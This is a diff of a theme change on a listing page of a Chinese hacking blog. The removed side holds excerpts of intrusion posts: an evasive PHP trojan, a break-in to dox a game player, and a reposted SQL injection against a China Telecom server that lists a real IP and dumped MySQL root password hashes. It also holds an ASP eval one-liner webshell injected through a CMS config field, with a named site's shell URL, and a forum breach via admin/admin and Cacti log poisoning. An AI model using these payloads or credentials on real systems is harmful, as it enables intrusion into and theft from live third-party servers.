@@ -1,272 +1,396 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+    </header>
+    
 
-      
-<main class="content" role="main">
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-12-24T16:31:00.000Z" itemprop="datePublished">
-          2012-12-25
-      </time>
-    
-    
-    | 
-    <a href='/tag/免杀/'>免杀</a>,
-    
-    <a href='/tag/木马/'>木马</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/959.seo/">利用重复参数数组变量构造php免杀木马</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        最近发现php一个很2b的字符串构造数组的方法：     &lt;?php     $str = &quot;a[]=1&amp;a[]=2&amp;b[]=3&quot;;     parse_str($str, $arr);     print_r($arr);     ?&gt;  &#160;  以上代码返回结果为：    Array ( [a] =&gt; Array ( [0] =&gt; 1 [1] =&gt; 2 ) [
-      
-      </p>
-      
-      <p>
-          <a href="/959.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-12-24T16:30:05.000Z" itemprop="datePublished">
-          2012-12-25
-      </time>
-    
-    
-    | 
-    <a href='/tag/社工/'>社工</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/958.seo/">渗透某页游平台</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><p>作者：9999@f4ck</p>  <p>0x01.起因—为了部落</p>  <p>0x02.踩点—硬柿子</p>  <p>0x03.主站碰壁—鼻青脸肿</p>  <p>0x04.分站进行时—未战即降</p>  <p>0x05.僵局中闪现突破口—完成任务</p>  <p>0x06.扩大战果遇奇葩—步步为营</p>  <p>0x07.总结—耐心,恒心,细心</p>  <p><b>0x01. </b><b>起因..</b></p>  <p>一个朋友玩这个平台的某游戏, 跟以后生骂起来了, 找我帮忙搞出这人资料.. </p>  <p><b>0x02. </b><b>踩点</b></p>  <p>先随便看了看, 小收集一下资料.</p>  <p>主站连接全为phtml文件, 同IP有N个平台, 全是这家公司开的, 还有个开服表的站, 推送新开服内容全是其旗下平台的.. 恩.. 这个策略不错..</p>  <p>有个论坛, 每个平台指向的论坛地址不同, logo不同, 但是整合了ucenter的, 所以数据是相同的, dz x1.5架设, 同段不同服, [IP尾数差两位]</p>  <p>所有论坛地址加ucenter自动跳转同一个域名ucenter.<strong><strong>.com</p>  <p>恩, 目测创始站. Google下site:</strong></strong>.com inurl:php|asp|aspx|jsp, 出来的都是论坛, 语句改为site:www.<strong><strong>.com inurl:php|asp|aspx|jsp 噢. </p>  <p>Aucun document ne correspond aux termes de recherche spécifiés (<b>site:</strong></strong>.com inurl:php|asp|aspx|jsp</b>). 什么都没有..</p>  <p>主站于其他平台为同一服务器.</p>  <p>Hscan扫两个ip皆只开了80端口. http banner返回nginx, </p>  <p><a href="http://img.cker.in/5b3594a0bd5d_E4BD/clip_image002.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/5b3594a0bd5d_E4BD/clip_image002_thumb.jpg" width="279" height="137" /></a></p>  <p>测试文件尾名phtml phtmL, php pHp 确定都是<a href="http://ha.cker.in/tag/Linux" target="_blank">linux</a>服务器, </p>  <p>因未返回<a href="http://ha.cker.in/tag/nginx" target="_blank">nginx</a>版本, 继续测试<a href="http://ha.cker.in/tag/nginx" target="_blank">nginx</a>解析漏洞/.php, %00.php都失败. [两台服务器都测试了]</p>  <p>扫后台蛋都没扫出来.. 蛋开始隐隐作痛了..</p>  <p><b>0x03. </b><b>主站碰壁</b></p>  <p>在继续看主站.. </p>  <p>新闻和公共的连接方式都是</p>  <p><a href="http://www.****.com/index/news/gonggao/1103.phtm">http://www.****.com/index/news/gonggao/1103.phtm</a></p>  <p><a href="http://www.****.com/index/news/news/4103.phtm">http://www.****.com/index/news/news/4103.phtm</a></p>  <p>这样的, 像是htacsse rewrite了.</p>  <p>打开</p>  <p><a href="http://www.****.com/index/news">http://www.****.com/index/news</a></p>  <p><a href="http://www.****.com/index/">http://www.****.com/index/</a></p>  <p>都返回404, htacsse重定向没得跑了.</p>  <p>继续测试</p>  <p><a href="http://www.****.com/index/news/gonggao/1103-1.phtm">http://www.****.com/index/news/gonggao/1103-1.phtm</a></p>  <p>失败, cookie值中无可利用方向.</p>  <p>查看二级域名, 看看能不能有个admin.<strong><em>.com之类的后台管理地址. 唉.. 只有www和bbs..</p>  <p>在看看论坛吧, 顺便开始尝试<a href="http://ha.cker.in/tag/社工" target="_blank">社工</a>..进入公告发布板块看看管理员账户名, 同时</p>  <p><a href="http://whois.domaintools.com/*">http://whois.domaintools.com/*</a></em></strong>.com 一下看看注册域名和管理域名的人的资料.</p>  <p>都是domain@<em>**</em>.com …而且</p>  <p>Email Search: [这是这个email的图片]is associated with about <b>23 domains</b></p>  <p>23个域名.. 估计其他那些平台也都是这个邮箱注册的了..</p>  <p>在确定一下,随便查了几个其他平台的域名资料.. 果然都是这个邮箱…</p>  <p>资料填写也都是公司地址, 电话为座机, 和官网上的联系我们的号码是同样的.</p>  <p>蛋.. 你肿么了..</p>  <p><b>0x04.</b><b>分站进行时</b></p>  <p>公告板块翻了10几页, 发布公告人有13个以上.. ID都是GM0001-GM0024, ID都是20W+的.. 身份是编辑.. 用户组也改了名, 鼠标放到编辑二字上, 连接地址为home.php?mod=spacecp&amp;ac=usergroup&amp;gid=22 哦.. 因为dz从低级用户到管理员的groupID总共就10几个, 印象中.. 所以应该新建的用户组.. 不知权限如何.. 但估计很小..</p>  <p>点击名字查看资料却没有权限, 也懒得注册号去看, 因为应该还是没有权限的.. </p>  <p>这里就给个小tip, 也不是什么漏洞, 算是代码过滤不严谨吧. 是前段时间无意中发现的,.</p>  <p>———————————–Tip开始———————————–</p>  <p>Dz很多版本, 具体没有测试, 就是未注册用户和普通用户是没有权限查看其他用户资料的.</p>  <p>就拿官网举例吧, 公告发布人有个<a href="http://www.discuz.net/thread-2744369-1-1.html"></a><cite>Cnteacher</cite>, ID是859, groupID也是1,即管理员权限. 想进入空间看资料, <a href="http://www.discuz.net/home.php?mod=space&amp;uid=859">http://www.discuz.net/home.php?mod=space&amp;uid=859</a>, 却显示’请先登录后才能继续浏览’</p>  <p><a href="http://img.cker.in/5b3594a0bd5d_E4BD/clip_image004.jpg" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/5b3594a0bd5d_E4BD/clip_image004_thumb.jpg" width="573" height="498" /></a></p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/958.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-12-20T17:17:51.000Z" itemprop="datePublished">
-          2012-12-21
-      </time>
-    
-</span>
-      <h2 class="post-title"><a href="/957.seo/">中国电信某IDC服务器的奇葩漏洞致服务器沦陷</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><em>转的wooyun</em></p>  <p>发现的比较的偶然~<a href="http://ha.cker.in/tag/入侵" target="_blank">入侵</a>的比较愕然~</p>  <p>1.偶然间发现的电信的比较奇葩SQL<a href="http://ha.cker.in/tag/SQL注入" target="_blank">注入</a><a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>（貌似是为监控客户网站的访问情况），该情况可能在电信IDC具有通用性，测试地址<a href="http://118.123.206.9/preuid.php?uid=2610023800">http://118.123.206.9/preuid.php?uid=2610023800</a></p>  <p>Web Server: Apache/2.2.23 (Unix) PHP/5.4.7</p>  <p>Powered-by: PHP/5.4.7</p>  <p>DB Server: MySQL &gt;=5</p>  <p>Current User: root@localhost</p>  <p>Sql Version: 5.5.28-log</p>  <p>Current DB: analytics</p>  <p>System User: root@localhost</p>  <p>Host Name: localhost.localdomain</p>  <p>Installation dir: /usr</p>  <p>DB User &amp; Pass: root:<em>70A3DDDA7052B54160CE5B0BF385872C8E470224:localhost</p>  <p>root::localhost.localdomain</p>  <p>root::127.0.0.1</p>  <p>::localhost</p>  <p>::localhost.localdomain</p>  <p>remote:</em>A4B6157319038724E3560894F7F932C8886EBFCF:%</p>  <p>root:<em>70A3DDDA7052B54160CE5B0BF385872C8E470224:%</p>  <p>hpflow:</em>70A3DDDA7052B54160CE5B0BF385872C8E470224:118.123.206.9</p>  <p>web:<em>A4B6157319038724E3560894F7F932C8886EBFCF:%</p>  <p>hpflow:</em>70A3DDDA7052B54160CE5B0BF385872C8E470224:118.123.206.7</p>  <p>Data Bases: information_schema</p>  <p>IDC</p>  <p>analytics</p>  <p>mysql</p>  <p>netflow</p>  <p>performance_schema</p>  <p>rec_web</p>  <p>report</p>  <p>report1</p>  <p>test</p>  <p>web</p>  <p>web_test</p>  <p>zj</p>  <p><a href="http://img.cker.in/IDC_812C/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/IDC_812C/clip_image001_thumb.jpg" width="1074" height="411" /></a></p>  <p>前台没啥看的~</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/957.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-12-17T22:28:56.000Z" itemprop="datePublished">
-          2012-12-18
-      </time>
-    
-    
-    | 
-    <a href='/tag/一句话/'>一句话</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/956.seo/">马克思cms后台拿webshell方法</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        马克思cms后台拿webshell方法  这个方法容易引起出错，如果用这个方法建议用最快的速度给恢复。  系统-》站点配置-》模板与路径设置-》模板文件所在文件夹   html  改为     html&quot;%&gt;&lt;%eval request(&quot;123&quot;)%&gt;&lt;%’ 
+    <div id="container">
+      <div id="main">
 
-点 确认更新得到一句话连接地址：http://www.fst0316.com/max/inc/config.asp
-      
-      </p>
-      
-      <p>
-          <a href="/956.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-12-13T19:05:04.000Z" itemprop="datePublished">
-          2012-12-14
-      </time>
-    
-    
-    | 
-    <a href='/tag/钓鱼/'>钓鱼</a>,
-    
-    <a href='/tag/爆破/'>爆破</a>,
-    
-    <a href='/tag/短信轰炸/'>短信轰炸</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/955.seo/">短信平台相关常见问题整理</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>在近期的渗透测试项目中，在短信平台相关功能都出现了一些问题，现对渗透过程中发现，及wooyun上出现的相关短信平台的几类问题做个整理。</p>  <p>一、短信发送无频率限制</p>  <p>通过wooyun上搜索可见，该类漏洞是最为常见的。</p>  <p>漏洞相关链接：</p>  <p>万网发验证信息，无限时。无限次数形成<a href="http://ha.cker.in/tag/短信轰炸" target="_blank">短信轰炸</a> <a href="http://www.wooyun.org/bugs/wooyun-2010-07592">http://www.wooyun.org/bugs/wooyun-2010-07592</a>    <br />盛大网络短信ddos攻击漏洞 <a href="http://www.wooyun.org/bugs/wooyun-2010-02773">http://www.wooyun.org/bugs/wooyun-2010-02773</a></p>  <p>漏洞成因： 对发送信息功能调用未做任何限制</p>  <p>漏洞危害：</p>  <p>1、可针对某用户短时间内发送大量垃圾短信，造成短信轰炸攻击；</p>  <p>2、对于企业，每发一条短信，都是需要向运营商交付一些费用，尽管比个人用户费用低，但是一旦被恶意利用大量发送后，造成较大的直接经济损失。</p>  <p>漏洞修补：</p>  <p>1、限定同一手机号在一时间段内发送次数，如每分钟发送1次，具体落实需结合用户体验综合考虑；</p>  <p>2、使用强壮的验证码机制。</p>  <p>补充：曾在测试中发现某客户的验证码有效期为2分钟，即2分钟内无需修改验证码直接成功回放请求包，同样可造成短信炸弹工具。因此，务必保证验证码的强壮型，并采用一次一用机制。</p>  <p>二、短信发送内容来自客户端</p>  <p>这类漏洞一般不直观，直接由用户输入来定义短信内容的问题确实没遇到过，这里的漏洞是把短信内容放在的POST表单中，从页面上无法发现，需要抓包分析才能看到。</p>  <p>相关漏洞：</p>  <p>（知道这漏洞是哪家的同学也请嘘，咱不讨论它是谁的，另漏洞已经修补了）</p>  <p>某系统可以在WEB页面上选择手机品牌和型号，填入手机号码可发送下载地址至手机，具体操作界面如下图：</p>  <p><a href="http://img.cker.in/9dedeb5ea29c_9BB4/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/9dedeb5ea29c_9BB4/clip_image001_thumb.jpg" width="593" height="327" /></a></p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/955.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/959.seo/" title="利用重复参数数组变量构造php免杀木马" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-12-12T17:08:42.000Z" itemprop="datePublished">
-          2012-12-13
-      </time>
+    <h1 itemprop="name">利用重复参数数组变量构造php免杀木马</h1>
     
+     
+           <p itemprop="description" >最近发现php一个很2b的字符串构造数组的方法：     &amp;lt;?php     $str = &amp;quot;a[]=1&amp;amp;a[]=2&amp;amp;b[]=3&amp;quot;;     parse_str($str, $arr);     print_r($arr);     ?&amp;</p>
+        
     
-    | 
-    <a href='/tag/代码执行/'>代码执行</a>,
-    
-    <a href='/tag/cacti/'>cacti</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/954.seo/">沦陷学生之家，一次漂亮的渗透与源码分析</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><p>某某河畔是郫县男子dota技术专修学校里各种骚男闷女无聊打发时间的地方。使用的是pw+php bluster搭建的。负责维护的童鞋几乎把pw的基础代码都改写过了，代码安全性还是比较高的。但是这次无情的被沦陷了。</p>  <p>详细说明：</p>  <p>1. 沦陷备份服务器   <br />各种弱口令+cacti拿shell    <br />访问<a href="http://xxx.xxxhome.net，使用弱密码admin/admin进入管理页面">http://xxx.xxxhome.net，使用弱密码admin/admin进入管理页面</a>    <br />上网找了几个cacti的<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>，都没能利用上。于是自己开始下了一套cacti开始折磨。    <br />看到install目录下有几个.php文件，顿时眼前一亮</p>  <p><a href="http://img.cker.in/527aebd1fe39_801B/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/527aebd1fe39_801B/clip_image001_thumb.jpg" width="594" height="273" /></a></p>  <p>把cacti的日志文件设置为这几个文件中的一个，重新登陆一下，可以看到日志确实被写进去了，那么只要想办法产生一些&lt;?php这样的日志，就能执行代码了。最直接的想法那就是用&lt;?php这样的用户去登录，有兴趣的同学可以继续深入，我反正没成功，cacti把尖括号神马的都过滤掉了。这条路暂时封死了。</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/954.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-12-24T16:31:00.000Z" itemprop="datePublished">2012-12-25</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <nav class="pagination" role="pagination">
-    <a class="newer-posts" href="/page/28/">← Newer Posts</a>
-    <span class="page-number">Page 29 of 81</span>
-    <a class="older-posts" href="/page/30/">Older Posts →</a>
+    <a href="/958.seo/" title="渗透某页游平台" itemprop="url">
+  
+    <h1 itemprop="name">渗透某页游平台</h1>
+    
+     
+       <p itemprop="description" >作者：9999@f4ck  0x01.起因—为了部落  0x02.踩点—硬柿子  0x03.主站碰壁—鼻青脸肿  0x04.分站进行时—未战即降  0x05.僵局中闪现突破口—完成任务  0x06.扩大战果遇奇葩—步步为营  0x07.总结—耐心,恒心,细心  0x01. 起因.</p>
+      
+    
+    <time datetime="2012-12-24T16:30:05.000Z" itemprop="datePublished">2012-12-25</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/957.seo/" title="中国电信某IDC服务器的奇葩漏洞致服务器沦陷" itemprop="url">
+  
+    <h1 itemprop="name">中国电信某IDC服务器的奇葩漏洞致服务器沦陷</h1>
+    
+     
+       <p itemprop="description" >转的wooyun  发现的比较的偶然~入侵的比较愕然~  1.偶然间发现的电信的比较奇葩SQL注入漏洞（貌似是为监控客户网站的访问情况），该情况可能在电信IDC具有通用性，测试地址http://118.123.206.9/preuid.php?uid=2610023800  We</p>
+      
+    
+    <time datetime="2012-12-20T17:17:51.000Z" itemprop="datePublished">2012-12-21</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/956.seo/" title="马克思cms后台拿webshell方法" itemprop="url">
+  
+    <h1 itemprop="name">马克思cms后台拿webshell方法</h1>
+    
+     
+           <p itemprop="description" >马克思cms后台拿webshell方法  这个方法容易引起出错，如果用这个方法建议用最快的速度给恢复。  系统-》站点配置-》模板与路径设置-》模板文件所在文件夹   html  改为     html&amp;quot;%&amp;gt;&amp;lt;%eval request(&amp;quot;123&amp;</p>
+        
+    
+    <time datetime="2012-12-17T22:28:56.000Z" itemprop="datePublished">2012-12-18</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/955.seo/" title="短信平台相关常见问题整理" itemprop="url">
+  
+    <h1 itemprop="name">短信平台相关常见问题整理</h1>
+    
+     
+       <p itemprop="description" >在近期的渗透测试项目中，在短信平台相关功能都出现了一些问题，现对渗透过程中发现，及wooyun上出现的相关短信平台的几类问题做个整理。  一、短信发送无频率限制  通过wooyun上搜索可见，该类漏洞是最为常见的。  漏洞相关链接：  万网发验证信息，无限时。无限次数形成短信轰炸</p>
+      
+    
+    <time datetime="2012-12-13T19:05:04.000Z" itemprop="datePublished">2012-12-14</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/954.seo/" title="沦陷学生之家，一次漂亮的渗透与源码分析" itemprop="url">
+  
+    <h1 itemprop="name">沦陷学生之家，一次漂亮的渗透与源码分析</h1>
+    
+     
+       <p itemprop="description" >某某河畔是郫县男子dota技术专修学校里各种骚男闷女无聊打发时间的地方。使用的是pw+php bluster搭建的。负责维护的童鞋几乎把pw的基础代码都改写过了，代码安全性还是比较高的。但是这次无情的被沦陷了。  详细说明：  1. 沦陷备份服务器   各种弱口令+cacti拿s</p>
+      
+    
+    <time datetime="2012-12-12T17:08:42.000Z" itemprop="datePublished">2012-12-13</time>
+  </a>
+</section>
+
+
+  <nav id="page-nav" class="clearfix">
+    <a class="extend prev" rel="prev" href="/page/28/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/27/">27</a><a class="page-number" href="/page/28/">28</a><span class="page-number current">29</span><a class="page-number" href="/page/30/">30</a><a class="page-number" href="/page/31/">31</a><span class="space">&hellip;</span><a class="page-number" href="/page/81/">81</a><a class="extend next" rel="next" href="/page/30/">下一页 &raquo;</a>
   </nav>
-</main>
 
+</div>
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
 
-      
-<footer class="site-footer">
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
